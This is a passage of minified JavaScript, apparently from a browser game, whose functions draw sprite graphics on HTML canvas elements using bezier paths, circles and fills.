      n.bezierCurveTo(e * 274, e * 178.8000030517578, e * 263, e * 177.8000030517578, e * 255, e * 175.8000030517578);
      n.bezierCurveTo(e * 248, e * 175.8000030517578, e * 248, e * 175.8000030517578, e * 241, e * 175.8000030517578);
      n.bezierCurveTo(e * 240, e * 175.8000030517578, e * 240, e * 175.8000030517578, e * 239, e * 175.8000030517578);
      n.bezierCurveTo(e * 254, e * 200.8000030517578, e * 222, e * 211.8000030517578, e * 202, e * 212.8000030517578);
      n.bezierCurveTo(e * 168, e * 213.8000030517578, e * 151, e * 190.8000030517578, e * 163, e * 176.8000030517578);
      n.closePath();
      ye(n, undefined, t[3], e * 6);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 198, e * 161.4000015258789);
      n.bezierCurveTo(e * 198, e * 186.9000015258789, e * 198, e * 186.9000015258789, e * 198, e * 212.4000015258789);
      n.bezierCurveTo(e * 201, e * 212.4000015258789, e * 201, e * 212.4000015258789, e * 204, e * 212.4000015258789);
      n.bezierCurveTo(e * 204, e * 186.9000015258789, e * 204, e * 186.9000015258789, e * 204, e * 161.4000015258789);
      n.closePath();
      ye(n, t[0], t[1], e * 2);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 161, e * 194);
      n.bezierCurveTo(e * 188, e * 169, e * 231, e * 179, e * 241, e * 194);
      n.bezierCurveTo(e * 239.5, e * 196, e * 239.5, e * 196, e * 238, e * 198);
      n.bezierCurveTo(e * 221, e * 179, e * 182, e * 182, e * 165, e * 198);
      n.closePath();
      ye(n, t[0], t[1], e * 2);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 157, e * 188.80000019073486);
      n.bezierCurveTo(e * 162, e * 150.80000019073486, e * 241, e * 150.80000019073486, e * 245, e * 188.80000019073486);
      n.bezierCurveTo(e * 242, e * 224.80000019073486, e * 162, e * 228.80000019073486, e * 157, e * 188.80000019073486);
      n.bezierCurveTo(e * 159, e * 188.80000019073486, e * 159, e * 188.80000019073486, e * 161, e * 188.80000019073486);
      n.bezierCurveTo(e * 168, e * 216.80000019073486, e * 231, e * 218.80000019073486, e * 241, e * 188.80000019073486);
      n.bezierCurveTo(e * 236, e * 156.80000019073486, e * 169, e * 152.80000019073486, e * 161, e * 188.80000019073486);
      n.closePath();
      ye(n, t[0], t[1], e * 2);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 156, e * 188);
      n.bezierCurveTo(e * 160, e * 164, e * 183, e * 159, e * 201, e * 158);
      n.bezierCurveTo(e * 232, e * 159, e * 244, e * 174, e * 246, e * 188);
      n.bezierCurveTo(e * 245, e * 212, e * 213, e * 219, e * 201, e * 218);
      n.bezierCurveTo(e * 181, e * 221, e * 158, e * 207, e * 156, e * 190);
      n.closePath();
      ye(n, undefined, t[1], e * 2);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 162, e * 189);
      n.bezierCurveTo(e * 166, e * 170, e * 185, e * 165, e * 201, e * 164);
      n.bezierCurveTo(e * 227, e * 165, e * 240, e * 178, e * 239, e * 188);
      n.bezierCurveTo(e * 239, e * 204, e * 210, e * 210, e * 201, e * 210);
      n.bezierCurveTo(e * 182, e * 211, e * 166, e * 200, e * 162, e * 190);
      n.closePath();
      ye(n, undefined, t[1], e * 2);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 131, e * 262);
      n.bezierCurveTo(e * 136, e * 241, e * 144, e * 236, e * 158, e * 233);
      n.bezierCurveTo(e * 200.5, e * 233, e * 229, e * 232, e * 243, e * 233);
      n.bezierCurveTo(e * 259, e * 235, e * 267, e * 248, e * 269, e * 260);
      n.bezierCurveTo(e * 269, e * 266.5, e * 269, e * 266.5, e * 269, e * 273);
      n.bezierCurveTo(e * 265, e * 290, e * 251, e * 297, e * 242, e * 298);
      n.bezierCurveTo(e * 202, e * 298, e * 202, e * 298, e * 162, e * 298);
      n.bezierCurveTo(e * 148, e * 298, e * 136, e * 289, e * 132, e * 273);
      n.bezierCurveTo(e * 131.5, e * 268, e * 131.5, e * 268, e * 131, e * 263);
      n.bezierCurveTo(e * 135, e * 263, e * 135, e * 263, e * 139, e * 263);
      n.bezierCurveTo(e * 139, e * 281, e * 151, e * 287, e * 160, e * 290);
      n.bezierCurveTo(e * 200.5, e * 290, e * 200.5, e * 290, e * 241, e * 290);
      n.bezierCurveTo(e * 252, e * 290, e * 257, e * 281, e * 262, e * 271);
      n.bezierCurveTo(e * 261.5, e * 267, e * 261.5, e * 267, e * 261, e * 263);
      n.bezierCurveTo(e * 260, e * 249, e * 251, e * 242, e * 241, e * 241);
      n.bezierCurveTo(e * 240.5, e * 240.5, e * 240.5, e * 240.5, e * 240, e * 240);
      n.bezierCurveTo(e * 200, e * 240, e * 200, e * 240, e * 160, e * 240);
      n.bezierCurveTo(e * 145, e * 244, e * 142, e * 250, e * 139, e * 264);
      n.closePath();
      ye(n, t[0], t[0], e * 2);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 130, e * 264);
      n.bezierCurveTo(e * 132, e * 244, e * 144, e * 235, e * 157, e * 232);
      n.bezierCurveTo(e * 245, e * 232, e * 201, e * 232, e * 245, e * 232);
      n.bezierCurveTo(e * 264, e * 235, e * 269, e * 251, e * 270, e * 264);
      n.bezierCurveTo(e * 272, e * 291, e * 248, e * 299, e * 242, e * 299);
      n.bezierCurveTo(e * 200, e * 299, e * 200, e * 299, e * 158, e * 299);
      n.bezierCurveTo(e * 139, e * 298, e * 130, e * 276, e * 130, e * 265);
      n.closePath();
      ye(n, undefined, t[1], e * 2);
      return r;
    }
    function Et(e, i, t) {
      var r = document.createElement("canvas");
      var n = r.getContext("2d");
      r.width = e * 400;
      r.height = e * 400;
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 96.5, e * 277.34375);
      n.bezierCurveTo(e * 197.5, e * 259.84375, e * 197.5, e * 259.84375, e * 298.5, e * 242.34375);
      n.bezierCurveTo(e * 311.5, e * 231.34375, e * 307.5, e * 168.34375, e * 298.5, e * 150.34375);
      n.bezierCurveTo(e * 198, e * 170.34375, e * 198, e * 170.34375, e * 97.5, e * 190.34375);
      n.closePath();
      ye(n, t[1], t[2], e * 12);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 98.5, e * 214.34375);
      n.bezierCurveTo(e * 199, e * 196.34375, e * 199, e * 196.34375, e * 299.5, e * 178.34375);
      n.closePath();
      ye(n, undefined, t[2], e * 12);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 98.5, e * 247.34375);
      n.bezierCurveTo(e * 201.5, e * 229.34375, e * 201.5, e * 229.34375, e * 304.5, e * 211.34375);
      n.closePath();
      ye(n, undefined, t[2], e * 12);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 97.5, e * 189.34375);
      n.bezierCurveTo(e * 97, e * 199.84375, e * 97, e * 199.84375, e * 96.5, e * 210.34375);
      n.bezierCurveTo(e * 110.5, e * 204.34375, e * 110.5, e * 204.34375, e * 124.5, e * 198.34375);
      n.bezierCurveTo(e * 137.5, e * 203.84375, e * 137.5, e * 203.84375, e * 150.5, e * 209.34375);
      n.bezierCurveTo(e * 172, e * 197.84375, e * 172, e * 197.84375, e * 193.5, e * 186.34375);
      n.bezierCurveTo(e * 211.5, e * 189.84375, e * 211.5, e * 189.84375, e * 229.5, e * 193.34375);
      n.bezierCurveTo(e * 240.5, e * 193.34375, e * 240.5, e * 193.34375, e * 251.5, e * 193.34375);
      n.bezierCurveTo(e * 261, e * 182.84375, e * 261, e * 182.84375, e * 270.5, e * 172.34375);
      n.bezierCurveTo(e * 287.5, e * 169.34375, e * 287.5, e * 169.34375, e * 304.5, e * 166.34375);
      n.bezierCurveTo(e * 304.5, e * 156.34375, e * 300.5, e * 145.34375, e * 298.5, e * 147.34375);
      n.closePath();
      ye(n, t[3], t[4], e * 12);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 300.5, e * 147.34375);
      n.bezierCurveTo(e * 293.5, e * 121.34375, e * 278.5, e * 106.34375, e * 256.5, e * 101.34375);
      n.bezierCurveTo(e * 176.5, e * 145.34375, e * 176.5, e * 145.34375, e * 96.5, e * 189.34375);
      n.closePath();
      ye(n, t[5], t[6], e * 12);
      ze(n, e * 252.5, e * 129.34375, e * 18.027756377319946);
      ye(n, t[7]);
      ze(n, e * 248.5, e * 121.34375, e * 8.246211251235321);
      ye(n, t[8]);
      return r;
    }
    function Tt(e, i, t) {
      var r = document.createElement("canvas");
      var n = r.getContext("2d");
      r.width = e * 400;
      r.height = e * 400;
      n.globalAlpha = i ? 0.5 : 1;
      n.translate(e * 10, e * 5);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 100.5, e * 126.34375);
      n.bezierCurveTo(e * 151.5, e * 104.34375, e * 279.5, e * 188.34375, e * 297.5, e * 292.34375);
      n.bezierCurveTo(e * 222.5, e * 307.34375, e * 106.5, e * 196.34375, e * 100.5, e * 127.34375);
      n.closePath();
      ye(n, t[0], t[0], e * 12);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 106.5, e * 131.34375);
      n.bezierCurveTo(e * 140.5, e * 142.34375, e * 225.5, e * 184.34375, e * 290.5, e * 287.34375);
      n.bezierCurveTo(e * 270.5, e * 188.34375, e * 152.5, e * 118.34375, e * 107.5, e * 131.34375);
      n.closePath();
      ye(n, t[0]);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 157.5, e * 137.34375);
      n.bezierCurveTo(e * 161.5, e * 138.34375, e * 164.5, e * 140.34375, e * 168.5, e * 142.34375);
      n.bezierCurveTo(e * 165.5, e * 156.34375, e * 141.5, e * 176.34375, e * 126.5, e * 179.34375);
      n.bezierCurveTo(e * 123.5, e * 173.34375, e * 120.5, e * 169.34375, e * 120.5, e * 169.34375);
      n.bezierCurveTo(e * 141.5, e * 161.34375, e * 156.5, e * 145.34375, e * 155.5, e * 136.34375);
      n.closePath();
      ye(n, t[0]);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 196.5, e * 151.34375);
      n.bezierCurveTo(e * 211.5, e * 158.34375, e * 224.5, e * 171.34375, e * 229.5, e * 176.34375);
      n.bezierCurveTo(e * 246.5, e * 163.34375, e * 259.5, e * 166.34375, e * 272.5, e * 168.34375);
      n.bezierCurveTo(e * 254.5, e * 146.34375, e * 214.5, e * 145.34375, e * 198.5, e * 151.34375);
      n.closePath();
      ye(n, t[0], t[0], e * 12);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 154.5, e * 222.34375);
      n.bezierCurveTo(e * 164.5, e * 234.34375, e * 173.5, e * 242.34375, e * 178.5, e * 245.34375);
      n.bezierCurveTo(e * 174.5, e * 265.34375, e * 180.5, e * 274.34375, e * 186.5, e * 283.34375);
      n.bezierCurveTo(e * 165.5, e * 277.34375, e * 151.5, e * 245.34375, e * 155.5, e * 224.34375);
      n.closePath();
      ye(n, t[0], t[0], e * 12);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 279.5, e * 294.34375);
      n.bezierCurveTo(e * 286.5, e * 285.84375, e * 286.5, e * 285.84375, e * 293.5, e * 277.34375);
      n.bezierCurveTo(e * 315.5, e * 280.34375, e * 315.5, e * 280.34375, e * 337.5, e * 283.34375);
      n.bezierCurveTo(e * 340.5, e * 311.34375, e * 317.5, e * 326.34375, e * 307.5, e * 331.34375);
      n.closePath();
      ye(n, t[0], t[0], e * 12);
      n.globalAlpha = 1;
      n.translate(e * -10, e * -5);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 100.5, e * 126.34375);
      n.bezierCurveTo(e * 151.5, e * 104.34375, e * 279.5, e * 188.34375, e * 297.5, e * 292.34375);
      n.bezierCurveTo(e * 222.5, e * 307.34375, e * 106.5, e * 196.34375, e * 100.5, e * 127.34375);
      n.closePath();
      ye(n, t[1], t[2], e * 12);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 106.5, e * 131.34375);
      n.bezierCurveTo(e * 140.5, e * 142.34375, e * 225.5, e * 184.34375, e * 290.5, e * 287.34375);
      n.bezierCurveTo(e * 270.5, e * 188.34375, e * 152.5, e * 118.34375, e * 107.5, e * 131.34375);
      n.closePath();
      ye(n, t[3]);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 157.5, e * 137.34375);
      n.bezierCurveTo(e * 161.5, e * 138.34375, e * 164.5, e * 140.34375, e * 168.5, e * 142.34375);
      n.bezierCurveTo(e * 165.5, e * 156.34375, e * 141.5, e * 176.34375, e * 126.5, e * 179.34375);
      n.bezierCurveTo(e * 123.5, e * 173.34375, e * 120.5, e * 169.34375, e * 120.5, e * 169.34375);
      n.bezierCurveTo(e * 141.5, e * 161.34375, e * 156.5, e * 145.34375, e * 155.5, e * 136.34375);
      n.closePath();
      ye(n, t[4]);
      ze(n, e * 125.5, e * 140.34375, e * 11.180339887498949);
      ye(n, t[5]);
      ze(n, e * 122.5, e * 135.34375, e * 5.0990195135927845);
      ye(n, t[6]);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 196.5, e * 151.34375);
      n.bezierCurveTo(e * 211.5, e * 158.34375, e * 224.5, e * 171.34375, e * 229.5, e * 176.34375);
      n.bezierCurveTo(e * 246.5, e * 163.34375, e * 259.5, e * 166.34375, e * 272.5, e * 168.34375);
      n.bezierCurveTo(e * 254.5, e * 146.34375, e * 214.5, e * 145.34375, e * 198.5, e * 151.34375);
      n.closePath();
      ye(n, t[7], t[8], e * 12);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 154.5, e * 222.34375);
      n.bezierCurveTo(e * 164.5, e * 234.34375, e * 173.5, e * 242.34375, e * 178.5, e * 245.34375);
      n.bezierCurveTo(e * 174.5, e * 265.34375, e * 180.5, e * 274.34375, e * 186.5, e * 283.34375);
      n.bezierCurveTo(e * 165.5, e * 277.34375, e * 151.5, e * 245.34375, e * 155.5, e * 224.34375);
      n.closePath();
      ye(n, t[7], t[8], e * 12);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 279.5, e * 294.34375);
      n.bezierCurveTo(e * 286.5, e * 285.84375, e * 286.5, e * 285.84375, e * 293.5, e * 277.34375);
      n.bezierCurveTo(e * 315.5, e * 280.34375, e * 315.5, e * 280.34375, e * 337.5, e * 283.34375);
      n.bezierCurveTo(e * 340.5, e * 311.34375, e * 317.5, e * 326.34375, e * 307.5, e * 331.34375);
      n.closePath();
      ye(n, t[7], t[8], e * 12);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 296.5, e * 287.34375);
      n.bezierCurveTo(e * 311.5, e * 291.34375, e * 311.5, e * 291.34375, e * 326.5, e * 295.34375);
      n.closePath();
      ye(n, undefined, t[9], e * 6);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 294.5, e * 289.34375);
      n.bezierCurveTo(e * 308.5, e * 297.34375, e * 308.5, e * 297.34375, e * 322.5, e * 305.34375);
      n.closePath();
      ye(n, undefined, t[9], e * 6);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 294.5, e * 291.34375);
      n.bezierCurveTo(e * 304, e * 303.34375, e * 304, e * 303.34375, e * 313.5, e * 315.34375);
      n.closePath();
      ye(n, undefined, t[9], e * 6);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 226.5, e * 161.34375);
      n.bezierCurveTo(e * 230.5, e * 160.34375, e * 236.5, e * 158.34375, e * 238.5, e * 161.34375);
      n.bezierCurveTo(e * 238.5, e * 157.34375, e * 228.5, e * 159.34375, e * 227.5, e * 161.34375);
      n.closePath();
      ye(n, undefined, t[9], e * 4);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 167.5, e * 248.34375);
      n.bezierCurveTo(e * 165.5, e * 251.34375, e * 168.5, e * 256.34375, e * 168.5, e * 253.34375);
      n.bezierCurveTo(e * 166.5, e * 252.34375, e * 168.5, e * 246.34375, e * 166.5, e * 247.34375);
      n.closePath();
      ye(n, undefined, t[9], e * 3);
      return r;
    }
    function At(e, i, t) {
      var r = document.createElement("canvas");
      var n = r.getContext("2d");
      r.width = e * 309;
      r.height = e * 287;
      n.globalAlpha = i ? 0.5 : 1;
      n.translate(e * 10, e * 5);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 34.5, e * 38.53125);
      n.bezierCurveTo(e * 91.5, e * 30.53125, e * 138.5, e * 68.53125, e * 169.5, e * 93.53125);
      n.bezierCurveTo(e * 208.5, e * 128.53125, e * 226.5, e * 157.53125, e * 233.5, e * 209.53125);
      n.bezierCurveTo(e * 195.5, e * 218.53125, e * 138.5, e * 191.53125, e * 105.5, e * 157.53125);
      n.bezierCurveTo(e * 54.5, e * 112.53125, e * 41.5, e * 80.53125, e * 33.5, e * 38.53125);
      n.closePath();
      ye(n, t[0], t[0], e * 10);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 143.5, e * 74.53125);
      n.bezierCurveTo(e * 164.5, e * 73.53125, e * 159, e * 74.53125, e * 174.5, e * 74.53125);
      n.bezierCurveTo(e * 186, e * 86.53125, e * 186, e * 86.53125, e * 197.5, e * 98.53125);
      n.bezierCurveTo(e * 186, e * 97.03125, e * 186, e * 97.03125, e * 174.5, e * 95.53125);
      n.closePath();
      ye(n, t[0], t[0], e * 10);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 87.5, e * 142.53125);
      n.bezierCurveTo(e * 92, e * 160.03125, e * 92, e * 160.03125, e * 96.5, e * 177.53125);
      n.bezierCurveTo(e * 108, e * 181.53125, e * 108, e * 181.53125, e * 119.5, e * 185.53125);
      n.bezierCurveTo(e * 116.5, e * 175.53125, e * 116.5, e * 175.53125, e * 113.5, e * 165.53125);
      n.closePath();
      ye(n, t[0], t[0], e * 10);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 236.5, e * 189.53125);
      n.bezierCurveTo(e * 274.5, e * 197.53125, e * 255.5, e * 194.03125, e * 274.5, e * 198.53125);
      n.bezierCurveTo(e * 272.5, e * 236.53125, e * 261.5, e * 237.53125, e * 242.5, e * 248.53125);
      n.bezierCurveTo(e * 230.5, e * 231.03125, e * 230.5, e * 231.03125, e * 218.5, e * 213.53125);
      n.closePath();
      ye(n, t[0], t[0], e * 10);
      n.globalAlpha = 1;
      n.translate(e * -10, e * -5);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 34.5, e * 38.53125);
      n.bezierCurveTo(e * 91.5, e * 30.53125, e * 138.5, e * 68.53125, e * 169.5, e * 93.53125);
      n.bezierCurveTo(e * 208.5, e * 128.53125, e * 226.5, e * 157.53125, e * 233.5, e * 209.53125);
      n.bezierCurveTo(e * 195.5, e * 218.53125, e * 138.5, e * 191.53125, e * 105.5, e * 157.53125);
      n.bezierCurveTo(e * 54.5, e * 112.53125, e * 41.5, e * 80.53125, e * 33.5, e * 38.53125);
      n.closePath();
      ye(n, t[1], t[2], e * 10);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 143.5, e * 74.53125);
      n.bezierCurveTo(e * 164.5, e * 73.53125, e * 159, e * 74.53125, e * 174.5, e * 74.53125);
      n.bezierCurveTo(e * 186, e * 86.53125, e * 186, e * 86.53125, e * 197.5, e * 98.53125);
      n.bezierCurveTo(e * 186, e * 97.03125, e * 186, e * 97.03125, e * 174.5, e * 95.53125);
      n.closePath();
      ye(n, t[1], t[2], e * 10);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 87.5, e * 142.53125);
      n.bezierCurveTo(e * 92, e * 160.03125, e * 92, e * 160.03125, e * 96.5, e * 177.53125);
      n.bezierCurveTo(e * 108, e * 181.53125, e * 108, e * 181.53125, e * 119.5, e * 185.53125);
      n.bezierCurveTo(e * 116.5, e * 175.53125, e * 116.5, e * 175.53125, e * 113.5, e * 165.53125);
      n.closePath();
      ye(n, t[1], t[2], e * 10);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 236.5, e * 189.53125);
      n.bezierCurveTo(e * 274.5, e * 197.53125, e * 255.5, e * 194.03125, e * 274.5, e * 198.53125);
      n.bezierCurveTo(e * 272.5, e * 236.53125, e * 261.5, e * 237.53125, e * 242.5, e * 248.53125);
      n.bezierCurveTo(e * 230.5, e * 231.03125, e * 230.5, e * 231.03125, e * 218.5, e * 213.53125);
      n.closePath();
      ye(n, t[1], t[2], e * 10);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 109.5, e * 51.53125);
      n.bezierCurveTo(e * 107.5, e * 92.53125, e * 91.5, e * 95.53125, e * 59.5, e * 101.53125);
      ye(n, t[1], t[2], e * 7);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 72.5, e * 51.53125);
      n.bezierCurveTo(e * 71, e * 64.53125, e * 69.5, e * 76.53125, e * 69.5, e * 77.53125);
      n.closePath();
      ye(n, t[1], t[2], e * 7);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 84.5, e * 63.53125);
      n.bezierCurveTo(e * 70.5, e * 65.03125, e * 70.5, e * 65.03125, e * 56.5, e * 66.53125);
      n.closePath();
      ye(n, t[1], t[2], e * 7);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 125.5, e * 84.53125);
      n.bezierCurveTo(e * 125.5, e * 110.03125, e * 125.5, e * 110.03125, e * 125.5, e * 135.53125);
      n.closePath();
      ye(n, t[1], t[2], e * 7);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 149.5, e * 108.53125);
      n.bezierCurveTo(e * 150, e * 137.03125, e * 150, e * 137.03125, e * 150.5, e * 165.53125);
      n.closePath();
      ye(n, t[1], t[2], e * 7);
      return r;
    }
    function dt(e, i, t) {
      var r = document.createElement("canvas");
      var n = r.getContext("2d");
      var a = e * 130;
      var o = e * 142;
      var s = a / 2;
      var _ = o / 2;
      r.width = a;
      r.height = o;
      n.translate(s, _ + e * 7);
      n.globalAlpha = i ? 0.5 : 1;
      ze(n, 0, 0, e * 60);
      ye(n, t[0]);
      n.translate(0, e * -7);
      n.globalAlpha = 1;
      ze(n, 0, 0, e * 60);
      ye(n, t[1], t[2], e * 4);
      ze(n, 0, 0, e * 40);
      ye(n, t[3]);
      ze(n, 0, 0, e * 25);
      ye(n, t[4], t[5], e * 8);
      return r;
    }
    function ht(e, i, t) {
      var r = document.createElement("canvas");
      var n = r.getContext("2d");
      r.width = e * 130;
      r.height = e * 142;
      n.globalAlpha = i ? 0.5 : 1;
      n.save();
      n.translate(e * 65, e * 80);
      n.rotate(0.2);
      Ve(n, 9, e * 60, e * 10);
      n.restore();
      ye(n, t[0]);
      n.globalAlpha = 1;
      n.save();
      n.translate(e * 65, e * 71);
      n.rotate(0.2);
      Ve(n, 9, e * 60, e * 10);
      ye(n, t[1], t[2], 4);
      n.rotate(-0.32);
      Ve(n, 9, e * 38, e * 10);
      ye(n, t[3], t[4], 4);
      n.rotate(0.68);
      Ve(n, 9, e * 20, e * 8);
      ye(n, t[5], t[6], 6);
      n.restore();
      return r;
    }
    function It(e, i) {
      var t = document.createElement("canvas");
      var r = t.getContext("2d");
      t.width = e * 372;
      t.height = e * 375;
      r.globalAlpha = 0.5;
      r.translate(e * 15, e * 15);
      r.beginPath();
      r.lineCap = "round";
      r.lineJoin = "round";
      r.moveTo(e * 313.0000305175781, e * 76.58523559570312);
      r.bezierCurveTo(e * 308.0000305175781, e * 130.58523559570312, e * 279.0000305175781, e * 158.58523559570312, e * 254.00003051757812, e * 175.58523559570312);
      r.bezierCurveTo(e * 287.0000305175781, e * 182.58523559570312, e * 274.0000305175781, e * 181.08523559570312, e * 294.0000305175781, e * 186.58523559570312);
      r.bezierCurveTo(e * 293.5000305175781, e * 196.08523559570312, e * 293.5000305175781, e * 196.08523559570312, e * 293.0000305175781, e * 205.58523559570312);
      r.bezierCurveTo(e * 304.0000305175781, e * 201.08523559570312, e * 304.0000305175781, e * 201.08523559570312, e * 315.0000305175781, e * 196.58523559570312);
      r.bezierCurveTo(e * 350.0000305175781, e * 219.58523559570312, e * 343.0000305175781, e * 221.58523559570312, e * 351.0000305175781, e * 230.58523559570312);
      r.bezierCurveTo(e * 296.0000305175781, e * 260.5852355957031, e * 264.0000305175781, e * 256.5852355957031, e * 220.00003051757812, e * 236.58523559570312);
      r.bezierCurveTo(e * 233.00003051757812, e * 266.5852355957031, e * 232.00003051757812, e * 279.5852355957031, e * 231.00003051757812, e * 295.5852355957031);
      r.bezierCurveTo(e * 222.00003051757812, e * 297.5852355957031, e * 222.00003051757812, e * 297.5852355957031, e * 213.00003051757812, e * 299.5852355957031);
      r.bezierCurveTo(e * 219.50003051757812, e * 308.0852355957031, e * 219.50003051757812, e * 308.0852355957031, e * 226.00003051757812, e * 316.5852355957031);
      r.bezierCurveTo(e * 223.00003051757812, e * 344.5852355957031, e * 216.00003051757812, e * 350.5852355957031, e * 209.00003051757812, e * 363.5852355957031);
      r.bezierCurveTo(e * 154.00003051757812, e * 318.5852355957031, e * 156.00003051757812, e * 268.5852355957031, e * 160.00003051757812, e * 238.58523559570312);
      r.bezierCurveTo(e * 135.00003051757812, e * 268.5852355957031, e * 125.00003051757812, e * 267.5852355957031, e * 112.00003051757812, e * 272.5852355957031);
      r.bezierCurveTo(e * 104.50003051757812, e * 266.5852355957031, e * 104.50003051757812, e * 266.5852355957031, e * 97.00003051757812, e * 260.5852355957031);
      r.bezierCurveTo(e * 93.00003051757812, e * 271.0852355957031, e * 93.00003051757812, e * 271.0852355957031, e * 89.00003051757812, e * 281.5852355957031);
      r.bezierCurveTo(e * 66.00003051757812, e * 288.5852355957031, e * 59.000030517578125, e * 288.5852355957031, e * 39.000030517578125, e * 285.5852355957031);
      r.bezierCurveTo(e * 56.000030517578125, e * 216.58523559570312, e * 91.00003051757812, e * 204.58523559570312, e * 129.00003051757812, e * 189.58523559570312);
      r.bezierCurveTo(e * 90.00003051757812, e * 176.58523559570312, e * 89.00003051757812, e * 173.58523559570312, e * 79.00003051757812, e * 166.58523559570312);
      r.bezierCurveTo(e * 82.00003051757812, e * 155.08523559570312, e * 82.00003051757812, e * 155.08523559570312, e * 85.00003051757812, e * 143.58523559570312);
      r.bezierCurveTo(e * 75.50003051757812, e * 147.58523559570312, e * 75.50003051757812, e * 147.58523559570312, e * 66.00003051757812, e * 151.58523559570312);
      r.bezierCurveTo(e * 44.000030517578125, e * 133.58523559570312, e * 41.000030517578125, e * 124.58523559570312, e * 34.000030517578125, e * 102.58523559570312);
      r.bezierCurveTo(e * 100.00003051757812, e * 81.58523559570312, e * 134.00003051757812, e * 118.58523559570312, e * 150.00003051757812, e * 128.58523559570312);
      r.bezierCurveTo(e * 144.00003051757812, e * 102.58523559570312, e * 147.00003051757812, e * 90.58523559570312, e * 150.00003051757812, e * 80.58523559570312);
      r.bezierCurveTo(e * 159.50003051757812, e * 79.08523559570312, e * 159.50003051757812, e * 79.08523559570312, e * 169.00003051757812, e * 77.58523559570312);
      r.bezierCurveTo(e * 163.00003051757812, e * 72.58523559570312, e * 163.00003051757812, e * 72.58523559570312, e * 157.00003051757812, e * 67.58523559570312);
      r.bezierCurveTo(e * 162.00003051757812, e * 42.585235595703125, e * 169.00003051757812, e * 29.585235595703125, e * 182.00003051757812, e * 14.585235595703125);
      r.bezierCurveTo(e * 219.00003051757812, e * 48.585235595703125, e * 222.00003051757812, e * 92.58523559570312, e * 218.00003051757812, e * 112.58523559570312);
      r.bezierCurveTo(e * 239.00003051757812, e * 95.58523559570312, e * 242.00003051757812, e * 97.58523559570312, e * 249.00003051757812, e * 94.58523559570312);
      r.bezierCurveTo(e * 255.00003051757812, e * 103.08523559570312, e * 255.00003051757812, e * 103.08523559570312, e * 261.0000305175781, e * 111.58523559570312);
      r.bezierCurveTo(e * 261.5000305175781, e * 99.58523559570312, e * 261.5000305175781, e * 99.58523559570312, e * 262.0000305175781, e * 87.58523559570312);
      r.bezierCurveTo(e * 282.0000305175781, e * 77.58523559570312, e * 301.0000305175781, e * 74.58523559570312, e * 314.0000305175781, e * 76.58523559570312);
      r.closePath();
      ye(r, i[0]);
      r.globalAlpha = 1;
      r.translate(e * -15, e * -15);
      r.beginPath();
      r.lineCap = "round";
      r.lineJoin = "round";
      r.moveTo(e * 313.0000305175781, e * 76.58523559570312);
      r.bezierCurveTo(e * 308.0000305175781, e * 130.58523559570312, e * 279.0000305175781, e * 158.58523559570312, e * 254.00003051757812, e * 175.58523559570312);
      r.bezierCurveTo(e * 287.0000305175781, e * 182.58523559570312, e * 274.0000305175781, e * 181.08523559570312, e * 294.0000305175781, e * 186.58523559570312);
